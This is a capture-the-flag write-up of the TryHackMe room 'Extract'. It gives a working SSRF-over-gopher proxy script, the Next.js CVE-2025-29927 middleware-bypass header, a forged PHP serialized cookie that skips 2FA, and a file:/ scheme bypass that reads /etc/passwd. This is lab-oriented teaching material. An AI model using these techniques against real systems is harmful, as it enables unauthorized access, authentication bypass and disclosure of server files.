---
title: "TryHackMe: Extract"
author: jaxafed
categories: [TryHackMe]
tags: [linux, web, ssrf, file disclosure, gopher, next.js, php, cookie manipulation]
render_with_liquid: false
media_subpath: /images/tryhackme_extract/
image:
  path: room_image.webp
---

**Extract** started with discovering a **Server-Side Request Forgery (SSRF)** vulnerability and using it to discover an internal web application. By bypassing authentication on this internal application due to a vulnerability in **Next.js Middleware**, leveraging the `gopher://` scheme, we were able to obtain the first flag and a set of credentials.

Using the same **SSRF** method with the `gopher://` scheme, we also bypassed an IP address restriction on the first web application, allowing access to a login page where we used the discovered credentials. Finally, by bypassing **2FA** through **cookie manipulation**, we obtained the second flag and completed the room.

[![Tryhackme Room Link](room_card.webp){: width="300" height="300" .shadow}](https://tryhackme.com/room/extract){: .center }

## Initial Enumeration

### Nmap Scan

We start with a **port scan**:

```console
$ nmap -T4 -n -sC -sV -Pn -p- 10.10.82.71
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   256 48:fa:a1:66:94:2c:4f:2b:5b:5e:3b:bf:f7:b6:65:87 (ECDSA)
|_  256 95:0e:48:da:2a:ec:07:59:5a:be:2a:a9:d2:dd:e1:13 (ED25519)
80/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
|_http-title: TryBookMe - Online Library
|_http-server-header: Apache/2.4.58 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

There are two open ports:

* **22** (`SSH`)
* **80** (`HTTP`)

### Web 80

Visiting `http://10.10.82.71/`, we see a web application for viewing documents. Clicking one of the available documents shows its preview in an iframe.

![Web 80 Index](web_80_index.webp){: width="1200" height="600"}

Checking the page source, we see the iframe is loaded via the `/preview.php` endpoint with the `url` parameter.

![Web 80 Index Src](web_80_index_src.webp){: width="1200" height="600"}

The request to `/preview.php` looks like this:

![Web 80 Preview Burp](web_80_preview_burp.webp){: width="1000" height="500"}

Fuzzing the web application, we discover an interesting endpoint `/management`:

```console
$ ffuf -u 'http://10.10.82.71/FUZZ' -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -mc all -t 100 -ic -fc 404 -e .php
...
management              [Status: 301, Size: 315, Words: 20, Lines: 10, Duration: 118ms]
...
```
{: .wrap }

Visiting `/management` redirects us to `/management/`, where we only get an **"Access denied."** message.

![Web 80 Management](web_80_management.webp){: width="1200" height="600"}

## First Flag

### Enumerating the Web Application

It seems the only interesting endpoint we have found so far is `/preview.php` with the `url` parameter.

Creating a test file and serving it locally, then requesting `/preview.php?url=http://10.14.101.76/test.txt`, we see it works as expected. The server makes a request to our host and displays the response it received:

```console
$ echo "test" > test.txt

$ python3 -m http.server 80
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.10.82.71 - - [23/Aug/2025 07:27:44] "GET /test.txt HTTP/1.1" 200 -
```
![Web 80 Preview Test Burp](web_80_preview_test_burp.webp){: width="1000" height="500"}

### Checking the Schemes

Testing this **SSRF** vulnerability with the `file://` scheme to be able to read local files, we can see that it is blocked:

![Web 80 Preview File Burp](web_80_preview_file_burp.webp){: width="1000" height="500"}

However, apart from `http://` and `file://`, one of the most important schemes we can utilize with an **SSRF** vulnerability is `gopher://` as it allows sending raw data without any protocol overhead to any service. Testing it with `gopher://10.14.101.76:4444/_test`, we see it is not blocked and connects to our host and sends the data after `/_` as it is. This allows us to interact with all kinds of services. For example, by simply replacing `test` with a raw HTTP request, we could make **GET** or even **POST** requests, which is not possible with `http://` alone:

![Web 80 Preview Gopher Burp](web_80_preview_gopher_burp.webp){: width="1000" height="500"}

```console
$ nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.14.101.76] from (UNKNOWN) [10.10.82.71] 39240
test
```

### Fuzzing for Internal Services

Using `gopher://`, we can interact with many kinds of services, but currently we only know about the `HTTP` server running on port `80`. By using the **SSRF** vulnerability to check for internal services through port fuzzing, we can discover that port `10000` on `127.0.0.1` is also listening.

```console
$ ffuf -u 'http://10.10.82.71/preview.php?url=http://127.0.0.1:FUZZ/' -w <(seq 1 65535) -mc all -t 100 -fs 0
...
80                      [Status: 200, Size: 1735, Words: 304, Lines: 65, Duration: 5600ms]
10000                   [Status: 200, Size: 6131, Words: 104, Lines: 1, Duration: 158ms]
...
```
{: .wrap }

Requesting `http://127.0.0.1:10000/` via `/preview.php?url=http://127.0.0.1:10000/` shows a **Next.js** application:

![Web 80 Preview 10000 Burp](web_80_preview_10000_burp.webp){: width="1000" height="500"}

### Writing a Proxy

Since it is another web application, we can write a simple "proxy" in Python to start a server that listens for connections. Upon receiving a request, it reads all the data sent and forwards it to `127.0.0.1:10000` on the target via `/preview.php` using `gopher://`, then returns the response back to the client.

```py
#!/usr/bin/env python3

import socket
import requests
import urllib.parse
import threading

LHOST = '127.0.0.1'
LPORT = 5000
TARGET_HOST = "10.10.82.71"
HOST_TO_PROXY = "127.0.0.1"
PORT_TO_PROXY = 10000

def handle_client(conn, addr):
    with conn:
        data = conn.recv(65536)
        double_encoded_data = urllib.parse.quote(urllib.parse.quote(data))
        target_url = f"http://{TARGET_HOST}/preview.php?url=gopher://{HOST_TO_PROXY}:{PORT_TO_PROXY}/_{double_encoded_data}"
        resp = requests.get(target_url)
        conn.sendall(resp.content)

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((LHOST, LPORT))
    s.listen()
    print(f"Listening on {LHOST}:{LPORT}, proxying to {HOST_TO_PROXY}:{PORT_TO_PROXY} via {TARGET_HOST}...")
    while True:
        conn, addr = s.accept()
        client_thread = threading.Thread(target=handle_client, args=(conn, addr), daemon=True)
        client_thread.start()

```
{: file="proxy.py" }

Running the proxy:

```console
$ python3 proxy.py
Listening on 127.0.0.1:5000, proxying to 127.0.0.1:10000 via 10.10.82.71...
```

Now, by visiting `http://127.0.0.1:5000/` in the browser, we can access `http://127.0.0.1:10000/` normally; however, we only see the message **"Unauthorised access to this system is strictly prohibited."**.

![Web 10000 Index](web_10000_index.webp){: width="1200" height="600"}

### Next.js Authentication Bypass

Clicking the **API** link at the top redirects us to `/customapi`, but visiting the endpoint sends us back to the index page, indicating there might be an authentication check in place for unauthorized access.

![Web 10000 Customapi](web_10000_customapi.webp){: width="1000" height="500"}

Searching for vulnerabilities in **Next.js** that could help bypass authentication, we find **CVE-2025-29927**, which allows bypassing authentication if it is handled by **Next.js middleware**. This can be done by simply adding the following header to our requests:

```
x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware
```

You can read more about the vulnerability [here](https://zhero-web-sec.github.io/research-and-things/nextjs-and-the-corrupt-middleware).

As we can see, making a request to `/customapi` with this header works and bypasses the middleware authentication, allowing us to discover the first flag along with a set of credentials.

![Web 10000 Authentication Bypass](web_10000_authentication_bypass.webp){: width="1000" height="500"}

## Second Flag

### Bypassing IP Restriction on Management

Along with the credentials, we also see a message stating that the API is under maintenance and we should use the library portal. Returning to the library application on port 80, it seems the portal mentioned is at `/management/`. However, as we saw earlier, trying to access it resulted in an **Access denied** message.

![Web 80 Management](web_80_management.webp){: width="1200" height="600"}

However, we can try accessing it internally via our make-shift proxy by changing the `PORT_TO_PROXY` from `10000` to `80`, instead of accessing it directly, as follows:

```py
#!/usr/bin/env python3

import socket
import requests
import urllib.parse
import threading

LHOST = '127.0.0.1'
LPORT = 5000
TARGET_HOST = "10.10.82.71"
HOST_TO_PROXY = "127.0.0.1"
PORT_TO_PROXY = 80

def handle_client(conn, addr):
    with conn:
        data = conn.recv(65536)
        double_encoded_data = urllib.parse.quote(urllib.parse.quote(data))
        target_url = f"http://{TARGET_HOST}/preview.php?url=gopher://{HOST_TO_PROXY}:{PORT_TO_PROXY}/_{double_encoded_data}"
        resp = requests.get(target_url)
        conn.sendall(resp.content)

with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.bind((LHOST, LPORT))
    s.listen()
    print(f"Listening on {LHOST}:{LPORT}, proxying to {HOST_TO_PROXY}:{PORT_TO_PROXY} via {TARGET_HOST}...")
    while True:
        conn, addr = s.accept()
        client_thread = threading.Thread(target=handle_client, args=(conn, addr), daemon=True)
        client_thread.start()

```
{: file="proxy.py" }

Once again, running our proxy.

```console
$ python3 proxy.py
Listening on 127.0.0.1:5000, proxying to 127.0.0.1:80 via 10.10.82.71...
```

Now, making a request to `http://127.0.0.1:5000/management/`, we can see that we are able to access `http://127.0.0.1:80/management/` and get a login form.

![Web 80 Management Index](web_80_management_index.webp){: width="1200" height="600"}

### Cookie Manipulation

Logging in with the `librarian:L[REDACTED]!` credentials we discovered before, we get redirected to `/management/2fa.php` where the application asks for a **2FA** code.

![Web 80 Management 2fa](web_80_management_2fa.webp){: width="1200" height="600"}

We don't have the code, but checking the response to our login request, we can see the application setting the `auth_token` cookie as `O:9:"AuthToken":1:{s:9:"validated";b:0;}`, which looks like a serialized PHP object where the `validated` property (`boolean`) is set to **false** (`0`) in the `AuthToken` class.

![Web 80 Management Login Burp](web_80_management_login_burp.webp){: width="1300" height="500"}

Since there does not seem to be a signature attached to the cookie, we can simply try to modify the cookie by setting the `validated` property to **true** (changing its value from `0` to `1`) and make the request to `/management/2fa.php` with the modified cookie, and as we can see this works and allows us to capture the second flag and complete the room.

![Web 80 Management Flag Burp](web_80_management_flag_burp.webp){: width="1300" height="500"}

## Unintended - File Disclosure

Lastly, I wanted to share how the filter on `/preview.php` was inadequate and could be bypassed. While the `file://` scheme is blocked, `file:/` is not, which is actually sufficient to read files. For example, with a request like `/preview.php?url=file:/etc/passwd`, we are able to read files from the server, including the source code of the PHP web application, making obtaining the second flag trivial.

![Web 80 Preview Unintended Burp](web_80_preview_file_unintended_burp.webp){: width="1000" height="500"}

<style>
.center img {
  display:block;
  margin-left:auto;
  margin-right:auto;
}
.wrap pre{
    white-space: pre-wrap;
}
</style>
